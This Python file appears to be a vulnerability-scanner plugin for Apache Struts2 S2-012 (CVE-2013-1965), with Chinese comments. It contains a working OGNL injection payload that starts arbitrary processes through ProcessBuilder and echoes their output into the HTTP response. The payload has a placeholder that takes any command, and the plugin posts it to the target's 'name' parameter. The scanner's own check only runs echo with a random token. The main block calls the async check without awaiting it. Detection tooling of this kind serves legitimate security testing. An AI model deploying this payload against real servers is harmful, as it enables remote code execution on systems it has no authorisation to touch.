
#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, filter_str, get_useragent

class S2_012_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-012漏洞,又名CVE-2013-1965漏洞',
            'description': 'Struts2 S2-012漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.2',
            'date': '2013-04-16',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/user.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.check_payload =  '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + '"echo",' + '\"' + self.capta + '\"' + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
        self.payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{S2_012})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'                                

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            self.check_data = {'name': self.payload.replace('S2_012', '"echo",' + '\"' + self.capta + '\"')}
            check_res = await request.post(self.url, data = self.check_data, headers = self.headers)
            check_str = filter_str(list(await check_res.text()))
            if check_res.status == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_012 = S2_012_BaseVerify('http://localhost:8080/s2_012_war_exploded/index.action')
    S2_012.check()